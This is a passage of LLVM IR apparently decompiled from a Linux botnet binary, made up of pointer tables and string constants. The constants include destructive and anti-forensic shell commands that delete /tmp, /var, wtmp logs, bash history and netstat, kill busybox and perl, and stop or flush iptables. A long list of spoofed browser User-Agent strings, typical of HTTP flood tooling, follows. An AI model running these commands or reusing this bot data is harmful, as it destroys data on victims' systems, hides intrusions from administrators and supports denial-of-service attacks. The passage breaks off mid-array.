getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_21494.854, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_214a4.855, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_214b4.856, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_214c0.857, i32 0, i32 0), i8* getelementptr inbounds ([20 x i8], [20 x i8]* @global_var_214d0.858, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_214e4.859, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_214f0.860, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_214fc.861, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_2150c.862, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_2151c.863, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_21520.864, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_21524.865, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_21528.866, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_2152c.867, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_21530.868, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_21534.869, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_21538.870, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_2153c.871, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_21540.872, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_21548.873, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_21550.874, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_21558.875, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_21560.876, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_21568.877, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_21570.878, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_21578.879, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_21580.880, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_21588.881, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_21590.882, i32 0, i32 0), i8* getelementptr inbounds ([18 x i8], [18 x i8]* @global_var_21598.883, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_215ac.884, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_215b8.885, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_215c4.886, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_215d0.887, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_215d8.888, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_215e4.889, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_215f0.890, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_215f8.891, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_21604.892, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_21610.893, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_2161c.894, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_21628.895, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_21634.896, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_21640.897, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_2164c.898, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_21654.899, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_2165c.900, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_21668.901, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_21674.902, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_21680.903, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_2168c.904, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_21698.905, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_216a4.906, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_216b8.907, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_216c4.908, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_216d0.909, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_216dc.910, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_216e8.911, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_216f4.912, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_21700.913, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_2170c.914, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_21718.915, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_21724.916, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_2172c.917, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_21734.918, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_21740.919, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_2174c.920, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_21758.921, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_21764.922, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_21770.923, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_2177c.924, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_21790.925, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_2179c.926, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_217a8.927, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_217b4.928, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_217c0.929, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_217cc.930, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_217d8.931, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_217e4.932, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_217f0.933, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_217fc.934, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_21804.935, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_2180c.936, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_21818.937, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_21824.938, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_21830.939, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_2183c.940, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_21848.941, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_21854.942, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_21868.943, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_21874.944, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_21880.945, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_2188c.946, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_21898.947, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_218a8.948, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_218b8.949, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_218c8.950, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_218d8.951, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_218e8.952, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_218f4.953, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_21900.954, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_21910.955, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_21920.956, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_21930.957, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_21940.958, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_21950.959, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @global_var_21960.960, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_21978.961, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_21988.962, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_21998.963, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_219a8.964, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_219b8.965, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_212fc.826, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_219c4.966, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_219d0.967, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_219d8.968, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_219e0.969, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_219e8.970, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_219f0.971, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_219f8.972, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_21a00.973, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_21a08.974, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_21a10.975, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_21a18.976, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_21a20.977, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_21a28.978, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_21a30.979, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_21a38.980, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_21a40.981, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_21a48.982, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_21a50.983, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_21a58.984, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_21a60.985, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_21a68.986, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_21a70.987, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_21a74.988, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_21a78.989, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_21a7c.990, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_21a80.991, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_21a84.992, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_21a88.993, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_21a8c.994, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_21a90.995, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_21a94.996, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_21a98.997, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_21a9c.998, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_21aa0.999, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_21aa4.1000, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_21aa8.1001, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_21aac.1002, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_21ab0.1003, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_21ab4.1004, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_21ab8.1005, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_21abc.1006, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_21ac0.1007, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_21ac4.1008, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_21ad0.1009, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_21ad8.1010, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_21ae0.1011, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_21ae8.1012, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_21aec.1013, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_21af0.1014, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_21af4.1015, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_21af8.1016, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_21afc.1017, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_21b00.1018, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_21b04.1019, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_21b08.1020, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_21b0c.1021, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_21b14.1022, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_21b1c.1023, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_21b24.1024, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_21b2c.1025, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_21b34.1026, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_21b3c.1027, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_21b44.1028, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_21b4c.1029, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_21b54.1030, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_21b5c.1031, i32 0, i32 0)]
@global_var_22be8.1034 = constant [100 x i8] c">%s.t && cd %s && for a in `ls -a %s`; do >$a; done; >retrieve ;echo ps aux >> proc ; pkill -9 %d\0D\0A\00"
@global_var_22c6c.1038 = constant [14 x i8] c"pkill -9 %s\0D\0A\00"
@global_var_fbe4.1039 = constant i32 -442564500
@global_var_22c7c.1041 = constant [43 x i8] c"rm -rf /tmp/* /var/* /var/run/* /var/tmp/*\00"
@global_var_22ca8.1043 = constant [21 x i8] c"rm -rf /var/log/wtmp\00"
@global_var_22cc0.1045 = constant [22 x i8] c"history -c;history -w\00"
@global_var_22cd8.1047 = constant [14 x i8] c"rm -rf /tmp/*\00"
@global_var_22ce8.1049 = constant [11 x i8] c"history -c\00"
@global_var_22cf4.1051 = constant [23 x i8] c"rm -rf ~/.bash_history\00"
@global_var_22d0c.1053 = constant [20 x i8] c"rm -rf /bin/netstat\00"
@global_var_22d20.1055 = constant [11 x i8] c"history -w\00"
@global_var_22d2c.1057 = constant [17 x i8] c"pkill -9 busybox\00"
@global_var_22d40.1059 = constant [14 x i8] c"pkill -9 perl\00"
@global_var_22d50.1061 = constant [22 x i8] c"service iptables stop\00"
@global_var_22d68.1063 = constant [36 x i8] c"/sbin/iptables -F;/sbin/iptables -X\00"
@global_var_22db4.1065 = constant [62 x i8] c"Mozilla/5.0 (compatible; Konqueror/3.0; i686 Linux; 20021117)\00"
@global_var_22df4.1066 = constant [64 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) SkypeUriPreview Preview/0.5\00"
@global_var_22e34.1067 = constant [144 x i8] c"Mozilla/5.0 (iPhone; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10\00"
@global_var_22ec4.1068 = constant [55 x i8] c"Mozilla/5.0 Galeon/1.0.3 (X11; Linux i686; U;) Gecko/0\00"
@global_var_22efc.1069 = constant [32 x i8] c"Opera/6.04 (Windows XP; U) [en]\00"
@global_var_22f1c.1070 = constant [24 x i8] c"Opera/9.99 (X11; U; sk)\00"
@global_var_22f34.1071 = constant [86 x i8] c"Mozilla/6.0 (Future Star Technologies Corp. Star-Blade OS; U; en-US) iNet Browser 2.5\00"
@global_var_22f8c.1072 = constant [157 x i8] c"Mozilla/5.0(iPad; U; CPU iPhone OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B314 Safari/531.21.10gin_lib.cc\00"
@global_var_2302c.1073 = constant [82 x i8] c"Mozilla/5.0 Galeon/1.2.9 (X11; Linux i686; U;) Gecko/20021213 Debian/1.2.9-0.bunk\00"
@global_var_23080.1074 = constant [115 x i8] c"Mozilla/5.0 Slackware/13.37 (X11; U; Linux x86_64; en-US) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.41\00"
@global_var_230f4.1075 = constant [63 x i8] c"Mozilla/5.0 (compatible; iCab 3.0.3; Macintosh; U; PPC Mac OS)\00"
@global_var_23134.1076 = constant [182 x i8] c"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/886; U; en) Presto/2.4.15Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0\00"
@global_var_231ec.1077 = constant [83 x i8] c"Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.9a8) Gecko/2007100620 GranParadiso/3.1\00"
@global_var_23240.1078 = constant [88 x i8] c"Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)\00"
@global_var_23298.1079 = constant [88 x i8] c"Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en; rv:1.8.1.11) Gecko/20071128 Camino/1.5.4\00"
@global_var_232f0.1080 = constant [64 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201\00"
@global_var_23330.1081 = constant [69 x i8] c"Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.6) Gecko/2009020911\00"
@global_var_23378.1082 = constant [88 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; cs; rv:1.9.2.6) Gecko/20100628 myibrow/4alpha2\00"
@global_var_233d0.1083 = constant [106 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; MyIE2; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0)\00"
@global_var_2343c.1084 = constant [87 x i8] c"Mozilla/5.0 (Windows; U; Win 9x 4.90; SG; rv:1.9.2.4) Gecko/20101104 Netscape/9.1.0285\00"
@global_var_23494.1085 = constant [80 x i8] c"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko/20090327 Galeon/2.0.7\00"
@global_var_234e4.1086 = constant [34 x i8] c"Mozilla/5.0 (PLAYSTATION 3; 3.55)\00"
@global_var_23508.1087 = constant [91 x i8] c"Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Thunderbird/38.2.0 Lightning/4.0.2\00"
@global_var_23564.1088 = constant [15 x i8] c"wii libnup/1.0\00"
@global_var_23574.1089 = constant [47 x i8] c"Mozilla/4.0 (PSP (PlayStation Portable); 2.00)\00"
@global_var_235a4.1090 = constant [33 x i8] c"PSP (PlayStation Portable); 2.00\00"
@global_var_235c8.1091 = constant [34 x i8] c"Bunjalloo/0.7.6(Nintendo DS;U;en)\00"
@global_var_235ec.1092 = constant [26 x i8] c"Doris/1.15 [en] (Symbian)\00"
@global_var_23608.1093 = constant [61 x i8] c"BlackBerry7520/4.0.0 Profile/MIDP-2.0 Configuration/CLDC-1.1\00"
@global_var_23648.1094 = constant [140 x i8] c"BlackBerry9700/5.0.0.743 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/100findlinks/2.0.1 (+http://wortschatz.uni-leipzig.de/findlinks/)\00"
@global_var_236d4.1095 = constant [69 x i8] c"findlinks/1.1.6-beta6 (+http://wortschatz.uni-leipzig.de/findlinks/)\00"
@global_var_2371c.1096 = constant [69 x i8] c"findlinks/1.1.6-beta4 (+http://wortschatz.uni-leipzig.de/findlinks/)\00"
@global_var_23764.1097 = constant [69 x i8] c"findlinks/1.1.6-beta1 (+http://wortschatz.uni-leipzig.de/findlinks/)\00"
@global_var_237ac.1098 = constant [69 x i8] c"findlinks/1.1.5-beta7 (+http://wortschatz.uni-leipzig.de/findlinks/)\00"
@global_var_237f4.1099 = constant [81 x i8] c"Mozilla/5.0 (Windows; U; WinNT; en; rv:1.0.2) Gecko/20030311 Beonex/0.8.2-stable\00"
@global_var_23848.1100 = constant [78 x i8] c"Mozilla/5.0 (Windows; U; WinNT; en; Preview) Gecko/20020603 Beonex/0.8-stable\00"
@global_var_23898.1101 = constant [105 x i8] c"Mozilla/5.0 (X11; U; Linux i686; nl; rv:1.8.1b2) Gecko/20060821 BonEcho/2.0b2 (Debian-1.99+2.0b2+dfsg-1)\00"
@global_var_23904.1102 = constant [81 x i8] c"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1b2) Gecko/20060821 BonEcho/2.0b2\00"
@global_var_23958.1103 = constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1b2) Gecko/20060826 BonEcho/2.0b2\00"
@global_var_239b4.1104 = constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.8.1b2) Gecko/20060831 BonEcho/2.0b2\00"
@global_var_23a10.1105 = constant [97 x i8] c"Mozilla/5.0 (X11; U; Linux x86_64; en-GB; rv:1.8.1b1) Gecko/20060601 BonEcho/2.0b1 (Ubuntu-edgy)\00"
@global_var_23a74.1106 = constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1a3) Gecko/20060526 BonEcho/2.0a3\00"
@global_var_23ad0.1107 = constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2\00"
@global_var_23b2c.1108 = constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2\00"
@global_var_23b88.1109 = constant [96 x i8] c"Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2\00"
@global_var_23be8.1110 = constant [71 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: webetrex)\00"
@global_var_23c30.1111 = constant [150 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: unblock4myspace)AppEngine-Google; (+http://code.google.com/appengine; appid: tunisproxy)\00"
@global_var_23cc8.1112 = constant [74 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: proxy-in-rs)\00"
@global_var_23d14.1113 = constant [73 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: proxy-ba-k)\00"
@global_var_23d60.1114 = constant [78 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: moelonepyaeshan)\00"
@global_var_23db0.1115 = constant [71 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: mirrorrr)\00"
@global_var_23df8.1116 = constant [84 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: mapremiereapplication)\00"
@global_var_23e4c.1117 = constant [79 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: longbows-hideout)\00"
@global_var_23e9c.1118 = constant [70 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: eduas23)\00"
@global_var_23ee4.1119 = constant [74 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: craigserver)\00"
@global_var_23f30.1120 = constant [73 x i8] c"AppEngine-Google; ( http://code.google.com/appengine; appid: proxy-ba-k)\00"
@global_var_23f7c.1121 = constant [71 x i8] c"magpie-crawler/1.1 (U; Linux amd64; en-GB; +http://www.brandwatch.net)\00"
@global_var_23fc4.1122 = constant [80 x i8] c"Mozilla/5.0 (compatible; MJ12bot/v1.2.4; http://www.majestic12.co.uk/bot.php?+)\00"
@global_var_24014.1123 = constant [80 x i8] c"Mozilla/5.0 (compatible; MJ12bot/v1.2.3; http://www.majestic12.co.uk/bot.php?+)\00"
@global_var_24064.1124 = constant [51 x i8] c"MJ12bot/v1.0.8 (http://majestic12.co.uk/bot.php?+)\00"
@global_var_24098.1125 = constant [51 x i8] c"MJ12bot/v1.0.7 (http://majestic12.co.uk/bot.php?+)\00"
@global_var_240cc.1126 = constant [72 x i8] c"Mozilla/5.0 (compatible; MojeekBot/2.0; http://www.mojeek.com/bot.html)\00"
@global_var_24114.1127 = constant [62 x i8*] [i8* getelementptr inbounds ([62 x i8], [62 x i8]* @global_var_22db4.1065, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @global_var_22df4.1066, i32 0, i32 0), i8* getelementptr inbounds ([144 x i8], [144 x i8]* @global_var_22e34.1067, i32 0, i32 0), i8* getelementptr inbounds ([55 x i8], [55 x i8]* @global_var_22ec4.1068, i32 0, i32 0), i8* getelementptr inbounds ([32 x i8], [32 x i8]* @global_var_22efc.1069, i32 0, i32 0), i8* getelementptr inbounds ([24 x i8], [24 x i8]* @global_var_22f1c.1070, i32 0, i32 0), i8* getelementptr inbounds ([86 x i8], [86 x i8]* @global_var_22f34.1071, i32 0, i32 0), i8* getelementptr inbounds ([157 x i8], [157 x i8]* @global_var_22f8c.1072, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @global_var_2302c.1073, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @global_var_23080.1074, i32 0, i32 0), i8* getelementptr inbounds ([63 x i8], [63 x i8]* @global_var_230f4.1075, i32 0, i32 0), i8* getelementptr inbounds ([182 x i8], [182 x i8]* @global_var_23134.1076, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @global_var_231ec.1077, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @global_var_23240.1078, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @global_var_23298.1079, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @global_var_232f0.1080, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 